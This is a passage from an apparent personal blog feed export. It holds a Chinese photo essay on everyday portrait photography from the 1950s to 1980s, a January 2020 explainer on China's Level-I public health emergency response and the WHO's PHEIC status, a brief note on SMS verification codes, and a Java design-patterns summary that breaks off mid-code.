<p><strong>渎神</strong></p>
<p>拍照渎神行为，这一东方古老帝国的现代祛魅方式，是从传统社会迈向现代社会的必要环节，而最终走向 “理性” 吗？诸神散去，还会出现有灵魂的心灵吗？</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmr9crTFFC3z2V5edJSf1MOEr5hbyQCFPm1FF8IlZSn0nmB2mL8Fk7WA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmxOD2597Pia1GnQrNgG0GgFwWJc30DuzJBUtdaPhljvMxTVfb6K9F9Dw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmLlwyhhs2SdJoNe2cVRlwzc6QCZ00UfCKOk5mySMLLDZRHydMr6gNug/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>三个自己</strong></p>
<p>一位女青年，合成的照片。三个自己。面孔的隐喻。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmIxc8gy1yD3BoaRjHO0FnSCGKPxY8zh7Qr8WUWJTHuibQkcV8QnIXURA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmA4wECiawq5lcwGIAZBficgOl8z3JCqwZHgQpHQkFLpw7Y1oQqARuNL1Q/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>革命同志</strong></p>
<p>同志间的合影，拒绝男女私谊，不同阶级之间也是壁垒森严不可逾越。不承认跨阶级的爱与友谊，那被当作不存在的。这时期的友谊是被严格界定的。</p>
<p>这一时期的主流价值观认定，把 “义气“ 看作友谊，那是封建阶级的把戏；建立在利害关系、交换关系上的所谓友谊、那是资产阶级的把戏。合影照上的同志们之间，那是无产阶级和一切被压迫被剥削的劳动人民之间纯真、朴素而又坚定的友谊和感情。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmVdnzs5FmrH0UPYyvjdTkoTElsT6fH4OgbRicozUcf4GAlT3kY4WnVfQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmtnyLk2jLo7liaYicWIlnLWKwOgmnQhHzLtE0rjyBHuW4TA6pgo5y23ww/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>美丽新世界</strong></p>
<p>未来 —— 愿景 —— 图像</p>
<p>未来：共产主义是天堂，社会主义是桥梁</p>
<p>愿景：行有小包车，住有大瓦房；楼上楼下，电灯电话；土豆加牛肉。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmHcicOWkoYLV1caSQdWAhicq9XQx5QXeaT45Oqywxg8lX9I0uqj5jAJmg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmnBu7wyWsh8jldnZiaKzIlfa5GMsL20vAJnQQkhIXIfJe6qDbAC4bS7g/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmAoQtKqQSp9so46yMdZIhmzxkicRAuLyic6Dn9q3ML1ia3WGWXB5l70k5g/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>人与动物</strong></p>
<p>这一时期，日常照相行为中，人与动物的关系——特别是大量涌现的人与名胜古迹中动物塑像的关系，呈现出一种十分奇特的面貌，这在先前，或其后的照相行为中都很少见。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmIBjtagxoOY8HLp55BJucpGGPLdUNhiaDTwZA3rMuv4KZm4wGWcdkiboQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmZsWIrDlMbuXiaU2SibsIavuLWQFlP2d5Bq3YcgvB8oVePgSqqCEXUnJw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>三位男青年</strong></p>
<p>共同的职业背景，相似的生活方式，一致或相近的着装，共同的价值理想，甚至审美趣味、个人癖好，人们生活在努力建构，或想象出来的公共体——集体大家庭中，成为其中合格的一员。照相机为此立据，不是以文字作为证据，而是以图像。照相行为既建构，又强化了这一切。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmUNXwHOQ2fXC0JfOAz7kFicXErkYiciasD5ibgib3pzDRzkzpLTQz9ic1ySUw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmthmvvmjIgXh7NWXNy8ydtic6iagLD8X8YHhbiaCrgLDkQGaLALLHZaTjQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>三位女青年</strong></p>
<p>很显然，为了照相，她们穿上了自己体面的衣服，精心做了发型，配了鞋子，操持着道具。很长时间，这次照相都会成为记忆中最美好的一刻。当然，这是开放以后的情形了。</p>
<p>先前 ”女人形象“ 一直是个敏感问题。资产阶级欣赏玩赏的女人要有：曲线美，腿要比上身长，腰要很细很细的，瓜子脸，柳叶眉，樱桃口，蒜鼻子，眼睛要水滴滴的，皮肤白白嫩嫩的，手要似白玉和嫩藕。</p>
<p>而劳动人民的审美观点只要五官端正，身体端正，能劳动就美。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmx3ZjvAB677mibjm3X4k05f7zI0wGlZ73etLoG4zqicn6DSs6HtUiaMhRQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmiaoyCczs44vVjUkiaqMDibaquwlsTwCiaDLQLSic3ibPwG1b4Z8F0pupexgA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>天津之恋</strong></p>
<p>五十年代牵牵手，六十年代挎着走，七十年代搂着走，八十年代搂上了脖子。相声演员马季畅想二十世纪九十年代里，”女同志非骑男同志脖子上不可“。显然，作品描述的是城市市民阶层恋人们在室外——公开场合的亲昵行为，至于室内，特别是开放以后的都市青年恋人在室内的情形，那就另当别论了。此类照片稀缺，就是有，也是审慎而又有限度地记录下当时的情形。</p>
<p>此组照片拍摄于 1982 年 10 月。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmFonORZZQqiatjdpFap3wq557n53PRmFrxT2YjK7flRZxK4gaHXkXwgg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmU9Uv5B2rS1q8GUj7VkFftTOtKEvfgHia1bvOamzAJeJyadTvAPWp7MQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmdRYh8icGZGmzLfeDnh3hf4aSPLFT3NtbSg2kzPHam9JbTmh9b4E0SMQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmXABC4ogww4KbiaHpaRkaeGu35uSQqPu8EnibbNwPicOPiah7LaQNWqnibGg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmzGyHQeVs9mYsc0ibepIzA4eZgavhV0eFEhTJkjoeKmgqwIwwxfWjaoQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmDV80zmgpaIrZqLtvaMZdVV7w9wezeLrtY96oyI7nDLaURabpQ1ltwg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmmicWM5XgDNZx0tfDelU8T6eLqQOMf6hh34HRiaTSI97AWYohvoIvRuGA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4XdXc4EKB2iaYiasW2zR4RibnDCj1fTgloRnSK0qGEml8hoKibnBU8TgHg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>鞍山照相</strong></p>
<p>这些照片是鞍山多家照相馆在 1950 年至 1980 年间拍摄的。由于鞍山，特别是鞍钢，在辽宁、东北，甚至全国特殊的历史地位 —— 作为工业现代化先锋与样板的城市工人阶级与市民阶层生活照片，除了展现当年的照相技术、美学特征外，更是以特殊的方式，背景布的使用，呈现出一个时代的政治意识形态与商业美学样本，以及日常生活中，大众的精神面貌。</p>
<p>这些背景布的内容包括，工业化场景、现代化生活场景、革命圣地面貌、名胜古迹、北国风光、南国风光等，时代的印记投射在照相馆这一日常影像的生产场所。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm1TMxOibOySIicvm4TJzhMwfYCnHjRHibXSHCyJicrPX5GPgQD7aYh5YjTg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>志同道合</strong></p>
<p>爱人同志之间的浪漫合影，并不是在 1966 年中一夜之间被禁止、焚毁的。先前三四年间的讨论、争辩中，已经把此类照片定位于不符合新社会道德文化理想与新的生活方式的旧式图片。当 ”破四旧“ 来临，这些照片首当其冲，被付之一炬。文化大革命期间，照相馆的业务终归一类：只拍摄正面平光照片，所有照相饰品只规定为领袖书籍、政治符号与革命圣地或名胜古迹图像。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmFbbOzWib8xAnibqH1JBwSPtpZE3MvT60sILrAfBcGzdgLuCbXY8JmicVA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>闲暇</strong></p>
<p>几十年，国人缺乏休闲条件，对大多数为生计奔波的人来说，在自然中生存、索取，却视自然为敌。照相行为中，人与自然关系的时代特征显露无疑。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmacjx76obeFUAic4j376KfLFictwc4thtGXoOxVUEa3ia4n2ldGw04ujgg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>指</strong></p>
<p>指引，这一照相体态语与特定的历史阶段密切相联。普通人照相行为中的这一动作，从视觉来源上看，或直接模仿公开出版物、舞台上（样板戏），屏幕上的人物造型动作；还有一种来源，那就是传播广泛的 “领袖指引我前进” 这样表述的视觉化。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmFX1DOjrOL7oPvEKghTrwLEGsjHBruFH9TU1Hz1YoIM6f6ic9J5FaOAw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>站</strong></p>
<p>站要有站样、坐要有坐相。后革命时代， “站如松、坐如钟” 这样的口号喊得越来越少了，大众照相行为中紧绷着的身体也日益放松下来。几十年颠来倒去，世俗社会对日常行为身体的规制、仪轨、礼俗，此时也已经完全陌生。失范与乱相，应时而生。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm2NqF7lj4y6whNEub0JMHS2Jd8WrGk5kbXL6zYFaHXfxg2c0pUwjg7g/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>卧</strong></p>
<p>在草地上照相的种种姿态，国人的发明创造。这种现象存在于文革后期，持续大约 20 年间吧。后来，就消失了。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxms7Gygnfatqyl2p7goStXo665CBRU3H5ahrIPRPzNb4tWae7Vma3u9A/640?wx_fmt=jpeg" alt="img"></p>
]]></content>
      <categories>
        <category>photography</category>
      </categories>
      <tags>
        <tag>历史</tag>
        <tag>photography</tag>
        <tag>摄影</tag>
        <tag>中国</tag>
        <tag>艺术</tag>
      </tags>
  </entry>
  <entry>
    <title>重大突发公共卫生事件一级响应意味着什么</title>
    <url>/%E7%94%9F%E6%B4%BB/2020/01/%E9%87%8D%E5%A4%A7%E7%AA%81%E5%8F%91%E5%85%AC%E5%85%B1%E5%8D%AB%E7%94%9F%E4%BA%8B%E4%BB%B6%E4%B8%80%E7%BA%A7%E5%93%8D%E5%BA%94%E6%84%8F%E5%91%B3%E7%9D%80%E4%BB%80%E4%B9%88/</url>
    <content><![CDATA[<h1 id="“重大突发公共卫生事件一级响应”意味着什么？"><a href="#“重大突发公共卫生事件一级响应”意味着什么？" class="headerlink" title="“重大突发公共卫生事件一级响应”意味着什么？"></a><strong>“重大突发公共卫生事件一级响应”意味着什么？</strong></h1><p>为防控新型冠状病毒感染的肺炎疫情，连日来截止目前，湖南、广东、浙江、湖北、江苏、河北等 25 个省份决定启动重大突发公共卫生事件一级响应。</p>
<h2 id="那么，究竟什么是重大突发公共卫生事件一级响应？"><a href="#那么，究竟什么是重大突发公共卫生事件一级响应？" class="headerlink" title="那么，究竟什么是重大突发公共卫生事件一级响应？"></a><strong>那么，究竟什么是重大突发公共卫生事件一级响应？</strong></h2><p>我国于 2006 年发布的《国家突发公共卫生事件应急预案》表明，该应急机制适用于突然发生，造成或者可能造成社会公众身心健康严重损害的重大传染病、群体性不明原因疾病、重大食物和职业中毒以及因自然灾害、事故灾难或社会安全等事件引起的严重影响公众身心健康的公共卫生事件的应急处理工作。根据突发公共卫生事件性质、危害程度、涉及范围，突发公共卫生事件划可分为特别重大（Ⅰ 级）、重大（Ⅱ 级）、较大（Ⅲ 级）和一般（Ⅳ 级）四级。</p>
<p>其中，特别重大突发公共卫生事件主要包括：</p>
<p>（1）肺鼠疫、肺炭疽在大、中城市发生并有扩散趋势，或肺鼠疫、肺炭疽疫情波及 2 个以上的省份，并有进一步扩散趋势。 </p>
<p>（2）发生传染性非典型肺炎、人感染高致病性禽流感病例，并有扩散趋势。</p>
<p>（3）涉及多个省份的群体性不明原因疾病，并有扩散趋势。</p>
<p>（4）发生新传染病或我国尚未发现的传染病发生或传入，并有扩散趋势，或发现我国已消灭的传染病重新流行。</p>
<p>（5）发生烈性病菌株、毒株、致病因子等丢失事件。</p>
<p>（6）周边以及与我国通航的国家和地区发生特大传染病疫情，并出现输入性病例，严重危及我国公共卫生安全的事件。</p>
<p>（7）国务院卫生行政部门认定的其他特别重大突发公共卫生事件。</p>
<p>在一级响应下，省指挥部可以根据国务院的决策部署和统一指挥，组织协调本行政区域内应急处置工作。</p>
<h2 id="启动重大突发公共卫生事件一级响应后，各部门应该怎么做？"><a href="#启动重大突发公共卫生事件一级响应后，各部门应该怎么做？" class="headerlink" title="启动重大突发公共卫生事件一级响应后，各部门应该怎么做？"></a>启动重大突发公共卫生事件一级响应后，各部门应该怎么做？</h2><h3 id="各级人民政府"><a href="#各级人民政府" class="headerlink" title="各级人民政府"></a><strong>各级人民政府</strong></h3><p>组织协调有关部门参与突发公共卫生事件的处理；划定控制区域；疫情控制措施，比如限制集市、集会等人群聚集活动；流动人口管理；实施交通卫生检疫等。</p>
<h3 id="卫生行政部门"><a href="#卫生行政部门" class="headerlink" title="卫生行政部门"></a><strong>卫生行政部门</strong></h3><p>组织医疗机构、疾病预防控制机构和卫生监督机构开展突发公共卫生事件的调查与处理；采取应急控制措施；发布信息与通报；普及卫生知识等。</p>
<h3 id="医疗机构"><a href="#医疗机构" class="headerlink" title="医疗机构"></a><strong>医疗机构</strong></h3><p>开展病人接诊、收治和转运工作，实行重症和普通病人分开管理，对疑似病人及时排除或确诊；</p>
<p>做好医院内现场控制、消毒隔离、个人防护、医疗垃圾和污水处理工作，防止院内交叉感染和污染；做好传染病和中毒病人的报告等。</p>
<h3 id="其他机构"><a href="#其他机构" class="headerlink" title="其他机构"></a><strong>其他机构</strong></h3><p>除上述机构外，疾病预防控制机构、卫生监督机构、出入境检验检疫机构也会开展相应的应急处理工作，非事件发生地区也有相应的应急反应措施。</p>
<h2 id="面对一级响应，我们该做什么？"><a href="#面对一级响应，我们该做什么？" class="headerlink" title="面对一级响应，我们该做什么？"></a><strong>面对一级响应，我们该做什么？</strong></h2><p>面对一级响应，做好防护很重要。</p>
<p>1.减少非必要接触。尽量减少外出，避免到封闭、空气不流通的公众场所和人员密集场所。外出请记得佩戴口罩，医用口罩尤其是外科口罩能挡住大部分含有病毒的飞沫。尽量减少与疫情城市回来人员接触，有湖北武汉等地外出计划的最好取消行程。</p>
<p>2.注意个人卫生防护。养成良好的生活习惯，定时开窗通风，保持室内空气流通。咳嗽、饭前便后、接触或处理动物排泄物后，要用流水 + 肥皂&#x2F;洗手液洗手，或者使用含酒精成分的免洗洗手液，每次洗手至少 20 秒。咳嗽和打喷嚏时使用纸巾或衣袖遮掩口鼻，防止飞沫传播。</p>
<p>3.保持安全饮食习惯。不要购买和食用野味，少去海鲜、活禽市场或农场，尽量避免接触野生或养殖动物。制作各种肉类和蛋类要确保煮熟，处理生食和熟食的切菜板及刀具要分开。</p>
<p>4.主动实施居家隔离。有湖北武汉旅居史的人员请主动居家隔离 14 天，14 天内不要走亲访友，不与外人接触。居家隔离期间，一旦本人或家人出现有发热、乏力和干咳等呼吸系统症状，赶快戴上口罩去医院发热门诊及时就诊，主动告知最近是否到过武汉，并讲清近期直接接触情况，为医疗机构科学及时诊断治疗提供有效信息。</p>
<p>5.开展爱国卫生运动。全民积极开展清洁扫除，铲除病毒滋生和传播土壤。同时各单位、各大集贸市场等开展卫生整治，营造干净整洁的生产、生活环境。</p>
<p>6.加强联防联控预警。请大家互相监督，发现有来自湖北武汉的人员没有遵守居家隔离，及时给予劝诫或向当地卫生健康部门反映，群防群控、严防死守、共同努力保一方平安。</p>
<p>7.应当服从当地政府、居民委员会、村民委员会或者所属单位的指挥和安排，配合当地政府采取的应急处置措施，协助做好疫情防控工作。</p>
<h1 id="“国际突发公共卫生事件”-意味着什么？"><a href="#“国际突发公共卫生事件”-意味着什么？" class="headerlink" title="“国际突发公共卫生事件” 意味着什么？"></a>“国际突发公共卫生事件” 意味着什么？</h1><p>世界卫生组织 1 月 23 日宣布，新型冠状病毒疫情尚未构成国际关注的突发公共卫生事件。目前，世卫组织不建议任何涉及旅行或贸易的边境限制措施。可见国际突发公共卫生事件标准更高，那么它到底意味着什么呢？</p>
<p>根据《国际卫生条例》，“国际关注的突发公共卫生事件” 是指 “通过<strong>疾病的国际传播</strong>构成对其它国家的公共卫生风险，并可能需要采取<strong>协调一致的国际应对措施</strong>的<strong>不同寻常的事件</strong>。</p>
<p>该定义暗示出现了如下局面：严重、突然、不寻常、意外；对公共卫生的影响很可能超出受影响国国界；并且可能需要立即采取国际行动。</p>
<p>《国际卫生条例》规定，世卫组织总干事可决定召集突发事件委员会会议，就事件是否构成国际关注的突发公共卫生事件听取意见；在此之前，世卫组织总干事应与本国领土上发生事件的缔约国进行磋商，就是否构成国际关注的突发公共卫生事件评估信息和依据。</p>
<p>在某种疫情被宣布为 “国际关注的突发公共卫生事件” 后，WHO 总干事和各成员国需要根据委员会的建议，采取行动应对危机。根据 2005 年的《国际卫生条例》，各成员国均负有对 “国际关注的突发公共卫生事件” 作出迅速反应的法律责任。</p>
<p>在这之后，WHO 总干事有权力向其他国家发布建议，例如敦促它们不要在疫情爆发时关闭边界，不要对疫情爆发国实施旅行和贸易限制。这一点非常重要，因为一旦其他国家实施这些限制，就<strong>形同实际意义上的经济制裁</strong>，这可能会使疫情爆发国隐瞒疫情的真实情况，对于疫情的全球应对非常不利。</p>
<p>另外，宣布疫情为 “国际关注的突发公共卫生事件”，还有利于出现疫情的国家获得外部帮助，例如筹集外界援助资金等。</p>
<p>2009 年以来，WHO 共宣布了五起 “国际关注的突发公共卫生事件”，分别为 2009 年的甲型 H1N1 流感、2014 年的脊髓灰质炎疫情、2014 年西非的埃博拉疫情、2015-16 年的 “寨卡” 疫情以及 2018 年开始的刚果（金）埃博拉疫情（于 2019 年 7 月宣布）。</p>
<p><strong>参考：</strong></p>
<p>各省针对新型冠状病毒感染的肺炎疫情启动重大突发公共卫生事件一级响应机制 <a href="http://www.gov.cn/xinwen/2020-01/24/content_5472050.htm">http://www.gov.cn/xinwen/2020-01/24/content_5472050.htm</a></p>
<p>国家突发公共卫生事件应急预案 <a href="http://www.gov.cn/yjgl/2006-02/26/content_211654.htm">http://www.gov.cn/yjgl/2006-02/26/content_211654.htm</a></p>
<p>国际卫生条例 <a href="https://en.wikipedia.org/wiki/International_Health_Regulations">https://en.wikipedia.org/wiki/International_Health_Regulations</a></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>新型冠状病毒</tag>
        <tag>武汉</tag>
        <tag>肺炎</tag>
        <tag>重大突发公共卫生事件</tag>
        <tag>WHO</tag>
      </tags>
  </entry>
  <entry>
    <title>短信验证码业务</title>
    <url>/technology/2017/08/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%9A%E5%8A%A1/</url>
    <content><![CDATA[<h1 id="短信验证码业务介绍"><a href="#短信验证码业务介绍" class="headerlink" title="短信验证码业务介绍"></a>短信验证码业务介绍</h1><p>短信验证码是通过将验证因子置于短信息中，通过手机传达给用户，以此验证因子作为凭证达到服务端校验客户端身份的目的。短信信道相对于网络信道较安全，因此许多需要身份验证的业务（e.g. 注册、登录、找回密码等）常使用短信验证码来作为身份校验。</p>
<h1 id="短信验证码业务流程"><a href="#短信验证码业务流程" class="headerlink" title="短信验证码业务流程"></a>短信验证码业务流程<img src="http://img.willowspace.cn/willowspace_2016/1503687828140.png"></h1><h1 id="短信平台接入"><a href="#短信平台接入" class="headerlink" title="短信平台接入"></a>短信平台接入</h1><p>短信平台可以和第三方短信通道运营商签约自行搭建。也可以直接接入第三方短信平台。下面推荐一个短信平台。</p>
<h2 id="云之讯短信平台"><a href="#云之讯短信平台" class="headerlink" title="云之讯短信平台"></a>云之讯短信平台</h2><p>详细的接入流程参考<a href="http://www.ucpaas.com/">云之讯官网</a>上的文档</p>
<p>云之讯官方的SDK不太友好，可结合官方SDK自行开发。</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>业务</tag>
        <tag>短信</tag>
        <tag>验证码</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式归纳</title>
    <url>/technology/2017/01/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%BD%92%E7%BA%B3/</url>
    <content><![CDATA[<p>面向对象设计有几个原则（开闭、单一等），如果能够按照这些原则来开发软件，就能充分发挥面向对象的好处(<strong>低耦合，易扩展</strong>)。设计模式正式这些原则的体现，它是前人编码过程中的经验总结，针对某些问题而提出的解决方案。</p>
<p>最经典的设计模式出自《设计模式-可复用面向对象软件的基础》，针对不同具体问题，书中提出了23个设计模式，可大致分为三类：<strong>创建模式__、__结构模式</strong> 和 <strong>行为模式</strong></p>
<h1 id="一、创建模式"><a href="#一、创建模式" class="headerlink" title="一、创建模式"></a>一、创建模式</h1><blockquote>
<p>「单例、工厂、抽象工厂、原型、建造者」</p>
</blockquote>
<p>开发中会用到很多对象、最佳的使用对象的方式，是遵循面向对象的一个原则“&#x3D;&#x3D;针对接口编程&#x3D;&#x3D;”，即在程序代码中出现的对象，都是接口类型，而不要出现具体的类，创建型模式大部分都是为了解决这个问题，即：对象创建交给专门的几个类去负责，创建完之后交给用户使用，用户得到的是一个接口类型，既不必知道这些类具体是什么（只要知道它们都是某个接口的实现类），也不必知道是如何创建它们的。</p>
<h2 id="1-单例模式-Singleton"><a href="#1-单例模式-Singleton" class="headerlink" title="1. 单例模式(Singleton)"></a>1. 单例模式(Singleton)</h2><blockquote>
<p>「创建唯一的一个对象」</p>
</blockquote>
<ul>
<li>设计：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> A single=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> A <span class="title function_">getSingleton</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span>==single)&#123;</span><br><span class="line">            single=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> single;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> A.getSingleton();</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong></p>
</blockquote>
<p>如果是并发环境中、或者在好几个虚拟机之间创建唯一的对象，则要再用其他的方法，如并发控制、rmi等。</p>
<h2 id="2-工厂模式（Factory）"><a href="#2-工厂模式（Factory）" class="headerlink" title="2. 工厂模式（Factory）"></a>2. 工厂模式（Factory）</h2><blockquote>
<p>「最常见的一种模式，可在java类库中大量见到，用户只需要调用工厂方法类的相应方法即可创建对象」</p>
</blockquote>
<ul>
<li>设计：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Product 产品接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Product</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体产品A</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductA</span> <span class="keyword">implements</span> <span class="title class_">Product</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Factory 工厂接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Factory</span>&#123;</span><br><span class="line">    Product <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class FactoryA implements Factory&#123;</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">create</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ProductA</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Factory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FactoryA</span>();</span><br><span class="line"><span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> factory.create();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明</p>
</blockquote>
<ol>
<li>要修改Product对象的创建方式，客户端代码并不受影响</li>
<li>要创建另一种Product对象(如ProductB)，则创建一个Facrory的子类FactoryB，然后用这个对象来创建ProductB。虽然也修改了代码，但是仅仅限于创建Factory对象的地方，其他的业务逻辑部分并没有修改（业务逻辑指用到了Product类型的地方）</li>
<li>工厂方法的一种改进，叫做静态工厂方法，如果要创建另一种Product对象，把该过程写在工厂类的静态方法里，这在jdk类库里大量使用</li>
</ol>
<h2 id="3-抽象工厂（Abstract-Factory）"><a href="#3-抽象工厂（Abstract-Factory）" class="headerlink" title="3. 抽象工厂（Abstract Factory）"></a>3. 抽象工厂（Abstract Factory）</h2><blockquote>
<p>「创建一组对象」</p>
</blockquote>
<p>上面的工厂方法其实并没有体现出好处，因为每个工厂只创建一种对象，但是如果需要创建一批对象，好处就体现出来了。抽象工厂方法适用于类似下列情形：比如要更换程序界面的显示风格，如窗口、按钮、滚动条等。如果不用抽象工厂，就得一个个对象都替换掉，这显然不简单。实际上高层业务逻辑也只是针对这些窗口或者按钮的接口进行编程，抽象工厂可以很容地把这些对象立刻换成另外一批。</p>
<ul>
<li>设计：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//窗口对象接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Window</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//某种风格A的窗口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WindowA</span> <span class="keyword">implements</span> <span class="title class_">Window</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按钮对象接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Button</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//某种风格A的按钮</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ButtonA</span> <span class="keyword">implements</span> <span class="title class_">Button</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//工厂接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title 